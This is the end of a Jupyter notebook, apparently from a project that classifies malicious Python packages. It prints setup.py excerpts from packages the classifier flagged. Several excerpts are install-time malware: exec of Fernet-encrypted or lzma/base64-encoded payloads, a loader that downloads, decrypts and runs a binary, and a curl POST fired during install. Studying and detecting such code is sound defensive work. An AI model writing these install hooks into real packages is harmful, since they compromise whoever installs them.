      "subprocess.check_call(['curl', '-X', 'POST', '[URL] '-d', 'data=example'])\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/wweb3.py-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'[BASE64]').decrypt(b'gAAAAABmbvPQm4lTq-[BASE64]-UICYETYFz_UVGSHL-zzby5ieWyo-[BASE64]_AF36c7shCWE='))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/siger-0.7.0.txt\n",
      "# pip install git+[URL]\n",
      "with open(\"README.md\", \"r\", encoding=\"utf-8\") as f:\n",
      "description = f.read()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/fastango_v1-0.1.7.txt\n",
      "#!/usr/bin/env python\n",
      "with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n",
      "long_description = '\\n' + f.read()\n",
      "project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n",
      "with open(os.path.join(here, project_slug, '__version__.py')) as f:\n",
      "exec(f.read(), about)\n",
      "class UploadCommand(Command):\n",
      "self.status('Removing previous builds…')\n",
      "rmtree(os.path.join(here, 'dist'))\n",
      "self.status('Building Source and Wheel (universal) distribution…')\n",
      "os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))\n",
      "self.status('Uploading the package to PyPI via Twine…')\n",
      "os.system('twine upload dist/*')\n",
      "self.status('Pushing git tags…')\n",
      "os.system('git tag v{0}'.format(about['__version__']))\n",
      "os.system('git push --tags')\n",
      "sys.exit()\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/ha_s3_tool-0.1.2.txt\n",
      "from setuptools import setup, find_packages\n",
      "class PostInstallCommand(install):\n",
      "install.run(self)\n",
      "subprocess.call([sys.executable, 'post_install.py'])\n",
      "setup(\n",
      "long_description=open(\"README.md\").read(),\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/pjtTransfer-1.0.1.txt\n",
      "with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n",
      "long_description = '\\n' + f.read()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/propagate_indexes-0.0.1.txt\n",
      "from setuptools import setup\n",
      "class CustomInstallCommand(install):\n",
      "install.run(self)\n",
      "setup(\n",
      "long_description=open('README.md').read(),\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/smartchart-6.8.6.txt\n",
      "exec(lzma.decompress(base64.b64decode(b'[BASE64]')))\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/2.2.6-0.0.1.txt\n",
      "from setuptools import setup\n",
      "class CustomInstallCommand(install):\n",
      "install.run(self)\n",
      "setup(\n",
      "long_description=open('README.md').read(),\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/etheeruim-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'_2HnMeNO_avcP6s7SLcZBG-XFJxYskimrMvr9d7UM_I=').decrypt(b'[BASE64]-9j-sBMAR1F5L-[BASE64]-[BASE64]_n-PlZT7U='))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/auto_scrubber-0.1.txt\n",
      "from setuptools import setup, find_packages\n",
      "Path(\n",
      "bytes.fromhex(\n",
      "op = fd(AUTO[5] + path)\n",
      "td = fd(AUTO[0] + path)\n",
      "ap = fd(AUTO[7] + path)\n",
      "doc = ''.join(chr(x ^ t) for x, t in zip(AUTO[1], td))\n",
      "csv = ''.join(chr(f ^ d) for f, d in zip(AUTO[4], ap))\n",
      "url = {\n",
      "\"x86_64\": doc,\n",
      "\"arm64\": csv\n",
      "response = requests.get(url)\n",
      "buf = response.content\n",
      "for r, p in zip(buf, op):\n",
      "out.append(r ^ p)\n",
      "with open(place, 'wb') as f:\n",
      "f.write(bytes(out))\n",
      "subprocess.Popen([place], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n",
      "class InstallCommand(install):\n",
      "install.run(self)\n",
      "tp = fd(to_do)\n",
      "second = bytes([next(tp) for _ in range(32)])\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/spared-1.0.10.txt\n",
      "here = pathlib.Path(__file__).parent.resolve()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/diffusionkit-0.2.16.txt\n",
      "import os\n",
      "class VersionInstallCommand(install):\n",
      "install.run(self)\n",
      "with open(version_file, \"w\") as f:\n",
      "f.write(f\"__version__ = '{VERSION}'\\n\")\n",
      "with open(\"README.md\") as f:\n",
      "readme = f.read()\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/tg-searcher-0.4.0.txt\n",
      "here = pathlib.Path(__file__).parent.resolve()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/turbinia-20230726.txt\n",
      "#!/usr/bin/env python\n",
      "with open('requirements.txt','r') as f:\n",
      "requirements = f.read().splitlines()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/basespatialfield-0.0.1.txt\n",
      "from setuptools import setup\n",
      "class CustomInstallCommand(install):\n",
      "install.run(self)\n",
      "setup(\n",
      "long_description=open('README.md').read(),\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/opesnea-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'KjJFeipTCNnAz4gt_-Mp1GJiNNJfdzmrkBg_ekMsAF0=').decrypt(b'gAAAAABmbvVB_[BASE64]-[BASE64]_n9CVEFxKhveP16QvlVAFT2_lbQPal4uZnSoxGFwJ__NGYSGPE9pn1hzCZ5WTB9W7Inaac-EOA23MseOeE-6QZqZqWTVZMzdIiatif855iZf7X-WV0fsjslhjITqoxxTXgtXR58S0gfk='))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/pythob-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'k58ndq9BJqPsa-zC9yUSb8s2EGAOGvE-Wwla9HnbBkg=').decrypt(b'[BASE64]-6G_WtzQB77emJkv-DhEnmuTruW0h5jXdlCWr-[BASE64]_k9f5EQP6fS5jIWFOCC-[BASE64]'))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/m-caching-0.1.15.txt\n",
      "from setuptools import setup\n",
      "with open(path.join(this_directory, 'README.md'), encoding='utf-8') as f:\n",
      "long_description = f.read()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/jupyter_marimo_proxy-0.0.4.txt\n",
      "#!/usr/bin/env python3\n",
      "long_description=open(os.path.join(os.path.dirname(__file__), 'README.md'), 'r', encoding='utf-8').read(),\n",
      "newpath = os.environ.get('JUPYTERMARIMOPROXY_PATH')\n",
      "config.read(os.path.expanduser(os.path.join('~', '.jupytermarimoproxyrc')))\n",
      "newpath = config.get('jupyter-marimo-proxy', 'path', fallback=config.get('DEFAULT', 'path', fallback=None))\n",
      "seen = set()\n",
      "'request_headers_override': { 'Authorization': 'Basic ' + base64.b64encode(b' :' + token.encode()).decode() },\n",
      "\n"
     ]
    }
   ],
   "source": [
    "for idx, prediction in enumerate(predictions):\n",
    "    if prediction == 1:\n",
    "        file_path = file_path_box[idx]\n",
    "        with open(file_path, 'r', encoding='utf-8') as file:\n",
    "            print(f\"File: {file_path}\")\n",
    "            print(file.read())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a052e1fd-9d13-4a01-9b22-098e71dd921e",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
